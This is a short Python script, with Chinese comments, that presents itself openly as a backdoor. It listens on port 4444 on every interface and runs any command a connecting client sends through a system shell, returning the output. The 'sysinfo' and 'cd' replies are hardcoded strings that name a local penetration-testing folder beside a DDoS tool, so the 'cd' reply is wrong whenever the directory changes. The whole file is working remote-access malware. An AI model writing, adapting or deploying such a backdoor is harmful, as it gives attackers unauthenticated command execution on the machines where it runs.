#!/usr/bin/env python3
import socket
import subprocess
import threading
import os

class SimpleBackdoor:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.running = True
    
    def handle_client(self, client_socket):
        while self.running:
            try:
                # 接收命令
                command = client_socket.recv(1024).decode('utf-8').strip()
                
                if command.lower() == 'exit':
                    break
                elif command.lower() == 'sysinfo':
                    # 系统信息
                    info = f"系统: nt\n用户: 11798\n目录: E:\网络渗透\MHDDoS-main"
                    client_socket.send(info.encode('utf-8'))
                elif command.startswith('cd '):
                    # 切换目录
                    new_dir = command[3:].strip()
                    try:
                        os.chdir(new_dir)
                        client_socket.send(f"切换到: E:\网络渗透\MHDDoS-main".encode('utf-8'))
                    except:
                        client_socket.send("目录不存在".encode('utf-8'))
                else:
                    # 执行系统命令
                    try:
                        result = subprocess.run(command, shell=True, capture_output=True, text=True)
                        output = result.stdout if result.stdout else result.stderr
                        client_socket.send(output.encode('utf-8'))
                    except Exception as e:
                        client_socket.send(str(e).encode('utf-8'))
            
            except:
                break
        
        client_socket.close()
    
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        
        print(f"后门服务启动在 {self.host}:{self.port}")
        
        while self.running:
            try:
                client_socket, addr = server.accept()
                print(f"新连接: {addr}")
                
                # 新线程处理客户端
                client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
                client_thread.daemon = True
                client_thread.start()
            
            except KeyboardInterrupt:
                self.running = False
            except:
                pass
        
        server.close()

if __name__ == "__main__":
    backdoor = SimpleBackdoor()
    backdoor.start()
